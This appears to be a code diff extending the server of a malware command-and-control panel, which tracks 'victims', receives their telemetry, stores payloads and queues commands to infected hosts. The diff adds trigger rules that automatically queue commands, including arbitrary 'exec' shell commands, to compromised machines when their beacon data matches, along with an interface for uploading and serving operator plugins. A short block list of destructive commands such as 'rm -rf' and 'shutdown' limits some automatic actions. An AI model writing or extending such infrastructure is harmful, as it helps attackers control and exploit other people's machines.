@@ -1,5 +1,6 @@
 import os
 import json
+import re
 import threading
 import hashlib
 import logging
@@ -31,6 +32,7 @@ pending_commands = {}
 auto_deploy_targets = set()
 AUTO_DEPLOY_PATH = os.path.join(DATA_DIR, "auto_deploy.json")
 PAYLOAD_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), "dist")
+PLUGIN_DIR = os.path.join(os.path.dirname(__file__), "plugins")
 API_KEY = os.environ.get('C2_API_KEY')
 
 
@@ -59,6 +61,31 @@ def init_db():
             command TEXT NOT NULL,
             params_encrypted BLOB,
             result TEXT,
+            timestamp TEXT NOT NULL
+        )
+    """)
+    conn.execute("""
+        CREATE TABLE IF NOT EXISTS alert_rules (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            name TEXT NOT NULL,
+            field TEXT NOT NULL,
+            operator TEXT NOT NULL,
+            value TEXT NOT NULL,
+            action_type TEXT NOT NULL,
+            action_params TEXT,
+            enabled INTEGER DEFAULT 1,
+            created_at TEXT NOT NULL
+        )
+    """)
+    conn.execute("""
+        CREATE TABLE IF NOT EXISTS alert_log (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            rule_id INTEGER,
+            rule_name TEXT,
+            hostname TEXT NOT NULL,
+            matched_field TEXT,
+            matched_value TEXT,
+            action_taken TEXT,
             timestamp TEXT NOT NULL
         )
     """)
@@ -170,6 +197,7 @@ def _save_auto_deploy():
         pass
 
 
+os.makedirs(PLUGIN_DIR, exist_ok=True)
 _load_auto_deploy()
 
 
@@ -292,6 +320,168 @@ def get_command_log(hostname: str = None, limit: int = 20) -> list:
     ]
 
 
+def _load_alert_rules() -> list:
+    import sqlite3
+    conn = sqlite3.connect(DB_PATH)
+    rows = conn.execute(
+        "SELECT id, name, field, operator, value, action_type, action_params "
+        "FROM alert_rules WHERE enabled = 1"
+    ).fetchall()
+    conn.close()
+    return [
+        {'id': r[0], 'name': r[1], 'field': r[2], 'operator': r[3],
+         'value': r[4], 'action_type': r[5], 'action_params': r[6]}
+        for r in rows
+    ]
+
+
+def _eval_rule(rule: dict, beacon_data: dict, result_text: str) -> bool:
+    field = rule['field']
+    if field == 'command_result':
+        value = result_text or ''
+    else:
+        value = str(beacon_data.get(field, ''))
+    target = rule['value']
+    op = rule['operator']
+    if op == 'equals':
+        return value == target
+    elif op == 'contains':
+        return target in value
+    elif op == 'starts_with':
+        return value.startswith(target)
+    elif op == 'matches':
+        import re
+        try:
+            return bool(re.search(target, value))
+        except Exception:
+            return False
+    elif op == 'gt':
+        try:
+            return float(value) > float(target)
+        except Exception:
+            return False
+    elif op == 'lt':
+        try:
+            return float(value) < float(target)
+        except Exception:
+            return False
+    return False
+
+
+def _log_alert(rule_id: int, rule_name: str, hostname: str,
+               field: str, value: str, action: str):
+    import sqlite3
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute(
+        "INSERT INTO alert_log (rule_id, rule_name, hostname, "
+        "matched_field, matched_value, action_taken, timestamp) "
+        "VALUES (?, ?, ?, ?, ?, ?, ?)",
+        (rule_id, rule_name, hostname, field, value, action,
+         datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+    )
+    conn.commit()
+    conn.close()
+
+
+def _get_alert_log(hostname: str = None, limit: int = 50) -> list:
+    import sqlite3
+    conn = sqlite3.connect(DB_PATH)
+    if hostname:
+        rows = conn.execute(
+            "SELECT rule_name, hostname, matched_field, matched_value, "
+            "action_taken, timestamp FROM alert_log "
+            "WHERE hostname = ? ORDER BY id DESC LIMIT ?",
+            (hostname, limit)
+        ).fetchall()
+    else:
+        rows = conn.execute(
+            "SELECT rule_name, hostname, matched_field, matched_value, "
+            "action_taken, timestamp FROM alert_log "
+            "ORDER BY id DESC LIMIT ?",
+            (limit,)
+        ).fetchall()
+    conn.close()
+    return [
+        {'rule': r[0], 'hostname': r[1], 'field': r[2],
+         'value': r[3], 'action': r[4], 'timestamp': r[5]}
+        for r in rows
+    ]
+
+
+def evaluate_alert_rules(hostname: str, beacon_data: dict, result_text: str):
+    rules = _load_alert_rules()
+    dangerous_patterns = ['rm -rf', 'format', 'del /f', 'rd /s', 'shutdown']
+    for rule in rules:
+        if not _eval_rule(rule, beacon_data, result_text):
+            continue
+        rname = rule['name']
+        field = rule['field']
+        actual = result_text if field == 'command_result' else str(beacon_data.get(field, ''))
+        atype = rule['action_type']
+        logger.info("Alert matched: %s on %s (%s %s %s)", rname, hostname, field, rule['operator'], rule['value'])
+        if atype == 'notify_dashboard':
+            socketio.emit('rule_alert', {
+                'rule': rname, 'hostname': hostname,
+                'field': field, 'value': actual,
+            })
+            _log_alert(rule['id'], rname, hostname, field, actual, 'notified dashboard')
+        elif atype == 'log':
+            _log_alert(rule['id'], rname, hostname, field, actual, 'logged')
+            recent = _get_alert_log(hostname, limit=1)
+            if recent:
+                socketio.emit('alert_log_update', {'entry': recent[0]})
+        elif atype == 'auto_command':
+            try:
+                action_params = json.loads(rule['action_params']) if rule['action_params'] else {}
+                cmd_name = action_params.get('command', '')
+                cmd_params = action_params.get('params', {})
+                if cmd_name == 'exec':
+                    cmd_value = cmd_params.get('cmd', '')
+                    if any(d in cmd_value.lower() for d in dangerous_patterns):
+                        logger.warning("Alert auto_command blocked for %s: dangerous pattern", hostname)
+                        _log_alert(rule['id'], rname, hostname, field, actual,
+                                   f'auto_command blocked: dangerous pattern')
+                        continue
+                pending_commands[hostname] = {'command': cmd_name, 'params': cmd_params}
+                _log_alert(rule['id'], rname, hostname, field, actual,
+                           f'auto_command queued: {cmd_name}')
+                logger.info("Alert auto_command queued %s for %s (rule: %s)", cmd_name, hostname, rname)
+            except Exception as e:
+                logger.warning("Alert auto_command failed for %s: %s", hostname, e)
+
+
+def _parse_plugin_headers(path: str) -> dict:
+    try:
+        with open(path) as f:
+            src = f.read()
+        name = re.search(r'^PLUGIN_NAME\s*=\s*["\'](.+?)["\']', src, re.M)
+        ver = re.search(r'^PLUGIN_VERSION\s*=\s*["\'](.+?)["\']', src, re.M)
+        desc = re.search(r'^PLUGIN_DESCRIPTION\s*=\s*["\'](.+?)["\']', src, re.M)
+        size = os.path.getsize(path)
+        return {
+            'name': name.group(1) if name else os.path.splitext(os.path.basename(path))[0],
+            'version': ver.group(1) if ver else '0.0',
+            'description': desc.group(1) if desc else '',
+            'size': size,
+        }
+    except Exception:
+        return None
+
+
+def _list_plugins() -> list:
+    results = []
+    if not os.path.isdir(PLUGIN_DIR):
+        return results
+    for fname in sorted(os.listdir(PLUGIN_DIR)):
+        if not fname.endswith('.py'):
+            continue
+        path = os.path.join(PLUGIN_DIR, fname)
+        info = _parse_plugin_headers(path)
+        if info:
+            results.append(info)
+    return results
+
+
 @app.before_request
 def auth_check():
     if require_auth():
@@ -328,6 +518,7 @@ def telemetry():
         vdata = get_victim(hostname)
         socketio.emit('victim_update', {'hostname': hostname, 'info': vdata})
         logger.info("Telemetry from %s: status=%s", hostname, data.get('status'))
+        evaluate_alert_rules(hostname, data, result_text)
 
         if result_text:
             log_command(hostname, 'result', {}, result_text)
@@ -525,6 +716,62 @@ def scare_gifs():
     return send_file(path, mimetype='image/gif')
 
 
+@app.route('/api/extensions', methods=['GET'])
+def list_plugins():
+    if crypto is None:
+        return jsonify({'error': 'server locked'}), 401
+    return jsonify(_list_plugins())
+
+
+@app.route('/api/extensions/<name>/source', methods=['GET'])
+def download_plugin(name):
+    if crypto is None:
+        return jsonify({'error': 'server locked'}), 401
+    safe = os.path.basename(name)
+    path = os.path.join(PLUGIN_DIR, safe)
+    if not safe.endswith('.py') or '..' in safe:
+        return jsonify({'error': 'invalid name'}), 400
+    if not os.path.exists(path):
+        return jsonify({'error': 'not found'}), 404
+    with open(path) as f:
+        return f.read(), 200, {'Content-Type': 'text/x-python'}
+
+
+@app.route('/api/extensions/register', methods=['POST'])
+def upload_plugin():
+    if crypto is None:
+        return jsonify({'error': 'server locked'}), 401
+    file = request.files.get('file')
+    if not file or not file.filename.endswith('.py'):
+        return jsonify({'error': 'invalid file'}), 400
+    safe_name = os.path.basename(file.filename)
+    dest = os.path.join(PLUGIN_DIR, safe_name)
+    file.save(dest)
+    info = _parse_plugin_headers(dest)
+    if not info or not info.get('name'):
+        os.unlink(dest)
+        return jsonify({'error': 'plugin missing PLUGIN_NAME header'}), 400
+    logger.info("Plugin uploaded: %s v%s", info['name'], info['version'])
+    return jsonify(info)
+
+
+@app.route('/api/extensions/unregister', methods=['POST'])
+def delete_plugin():
+    if crypto is None:
+        return jsonify({'error': 'server locked'}), 401
+    name = (request.json or {}).get('name', '')
+    if not name:
+        return jsonify({'error': 'no name'}), 400
+    for fname in os.listdir(PLUGIN_DIR):
+        if fname.endswith('.py'):
+            info = _parse_plugin_headers(os.path.join(PLUGIN_DIR, fname))
+            if info and info['name'] == name:
+                os.unlink(os.path.join(PLUGIN_DIR, fname))
+                logger.info("Plugin deleted: %s", name)
+                return jsonify({'status': 'deleted'})
+    return jsonify({'error': 'not found'}), 404
+
+
 SHUTDOWN_KEY = os.environ.get('C2_SHUTDOWN_KEY', 'shutdown')
 
 
@@ -613,6 +860,125 @@ def handle_shutdown(data):
     logger.warning("Socket shutdown requested — stopping")
     emit('server_shutting_down', {'message': 'server is shutting down'})
     threading.Thread(target=lambda: os._exit(0), daemon=True).start()
+
+
+@app.route('/api/triggers', methods=['GET'])
+def list_alert_rules():
+    if crypto is None:
+        return jsonify({'error': 'server locked'}), 401
+    import sqlite3
+    conn = sqlite3.connect(DB_PATH)
+    rows = conn.execute(
+        "SELECT id, name, field, operator, value, action_type, "
+        "action_params, enabled, created_at FROM alert_rules ORDER BY id"
+    ).fetchall()
+    conn.close()
+    return jsonify([
+        {'id': r[0], 'name': r[1], 'field': r[2], 'operator': r[3],
+         'value': r[4], 'action_type': r[5], 'action_params': r[6],
+         'enabled': bool(r[7]), 'created_at': r[8]}
+        for r in rows
+    ])
+
+
+@app.route('/api/triggers', methods=['POST'])
+def create_alert_rule():
+    if crypto is None:
+        return jsonify({'error': 'server locked'}), 401
+    data = request.json or {}
+    required = ['name', 'field', 'operator', 'value', 'action_type']
+    for k in required:
+        if k not in data:
+            return jsonify({'error': f'missing {k}'}), 400
+    import sqlite3
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute(
+        "INSERT INTO alert_rules (name, field, operator, value, "
+        "action_type, action_params, created_at) VALUES (?, ?, ?, ?, ?, ?, ?)",
+        (data['name'], data['field'], data['operator'], data['value'],
+         data['action_type'], json.dumps(data.get('action_params', {})),
+         datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+    )
+    conn.commit()
+    rid = conn.execute("SELECT last_insert_rowid()").fetchone()[0]
+    conn.close()
+    logger.info("Alert rule created: %s (id=%d)", data['name'], rid)
+    return jsonify({'id': rid, 'status': 'created'})
+
+
+@app.route('/api/triggers/<int:rule_id>', methods=['PUT'])
+def update_alert_rule(rule_id):
+    if crypto is None:
+        return jsonify({'error': 'server locked'}), 401
+    data = request.json or {}
+    import sqlite3
+    conn = sqlite3.connect(DB_PATH)
+    existing = conn.execute(
+        "SELECT id FROM alert_rules WHERE id = ?", (rule_id,)
+    ).fetchone()
+    if not existing:
+        conn.close()
+        return jsonify({'error': 'not found'}), 404
+    updates = []
+    params = []
+    for k in ['name', 'field', 'operator', 'value', 'action_type']:
+        if k in data:
+            updates.append(f"{k} = ?")
+            params.append(data[k])
+    if 'action_params' in data:
+        updates.append("action_params = ?")
+        params.append(json.dumps(data['action_params']))
+    if 'enabled' in data:
+        updates.append("enabled = ?")
+        params.append(1 if data['enabled'] else 0)
+    if updates:
+        params.append(rule_id)
+        conn.execute(
+            f"UPDATE alert_rules SET {', '.join(updates)} WHERE id = ?",
+            params
+        )
+        conn.commit()
+    conn.close()
+    return jsonify({'status': 'updated'})
+
+
+@app.route('/api/triggers/<int:rule_id>', methods=['DELETE'])
+def delete_alert_rule(rule_id):
+    if crypto is None:
+        return jsonify({'error': 'server locked'}), 401
+    import sqlite3
+    conn = sqlite3.connect(DB_PATH)
+    conn.execute("DELETE FROM alert_rules WHERE id = ?", (rule_id,))
+    conn.commit()
+    conn.close()
+    return jsonify({'status': 'deleted'})
+
+
+@app.route('/api/triggers/<int:rule_id>/state', methods=['POST'])
+def toggle_alert_rule(rule_id):
+    if crypto is None:
+        return jsonify({'error': 'server locked'}), 401
+    import sqlite3
+    conn = sqlite3.connect(DB_PATH)
+    row = conn.execute(
+        "SELECT enabled FROM alert_rules WHERE id = ?", (rule_id,)
+    ).fetchone()
+    if not row:
+        conn.close()
+        return jsonify({'error': 'not found'}), 404
+    new_val = 1 if row[0] == 0 else 0
+    conn.execute("UPDATE alert_rules SET enabled = ? WHERE id = ?", (new_val, rule_id))
+    conn.commit()
+    conn.close()
+    return jsonify({'enabled': bool(new_val)})
+
+
+@app.route('/api/triggers/log', methods=['GET'])
+def alert_log():
+    if crypto is None:
+        return jsonify({'error': 'server locked'}), 401
+    hostname = request.args.get('hostname')
+    return jsonify(_get_alert_log(hostname))
 
 
 SPA_DIR = os.path.join(os.path.dirname(__file__), 'static')
